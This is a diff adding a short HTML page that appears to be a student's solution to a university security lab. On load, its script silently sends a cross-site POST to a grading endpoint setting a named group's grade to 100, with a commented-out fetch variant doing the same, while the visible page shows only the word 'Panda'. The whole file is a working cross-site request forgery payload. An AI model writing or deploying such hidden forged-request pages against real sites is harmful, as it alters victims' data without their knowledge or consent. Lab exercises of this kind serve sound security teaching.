@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html>
+<script>
+var xhr = new XMLHttpRequest();
+let url = "https://eve.cs.washington.edu/lab2/supersecuregradingsystem/?action=update-grade";
+xhr.open("POST", url, true);
+xhr.setRequestHeader('Content-Type', 'application/json');
+xhr.send(JSON.stringify({
+    "groups": "group_wenxuan_alan",
+    "grade": "100"
+}));
+/*
+let params = new FormData();
+params.append("groups", "group_wenxuan_alan");
+params.append("grade", "100");
+
+
+let url = "https://eve.cs.washington.edu/lab2/supersecuregradingsystem/?action=update-grade";
+fetch(url, { method : "POST", body : params, mode: 'no-cors' })
+    .then(console.log)
+*/
+// alnliu11@attu.cs.washington.edu
+</script>
+<body>
+Panda
+</body>
+</html>
